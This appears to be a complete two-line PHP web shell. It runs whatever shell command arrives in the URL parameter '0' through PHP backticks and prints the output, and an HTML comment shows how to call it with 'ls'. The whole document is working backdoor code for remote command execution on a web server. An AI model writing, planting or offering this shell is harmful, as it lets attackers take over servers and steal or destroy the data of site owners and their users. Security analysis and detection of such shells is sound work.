<?=`$_GET[0]`?>
<!-- tiny.php?0=ls -->